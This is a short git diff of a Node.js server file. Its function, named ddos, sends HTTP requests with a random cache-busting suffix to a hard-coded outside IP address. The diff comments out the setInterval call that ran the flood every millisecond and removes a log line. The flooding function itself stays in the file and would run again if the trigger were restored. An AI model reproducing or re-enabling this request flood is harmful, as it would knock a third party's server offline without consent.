@@ -10,8 +10,7 @@ res.send("randiap")
 res.end()
 
 })
-setInterval(ddos,1)
-
+// setInterval(ddos,1)
 function ddos(){
     const extra=Math.random()
     const uril='http://13.233.2.27:5000/a'+extra
@@ -25,7 +24,6 @@ function ddos(){
       
         // The whole response has been received. Print out the result.
         resp.on('end', () => {
-            console.log("hello m up")
         });
       
       }).on("error", (err) => {
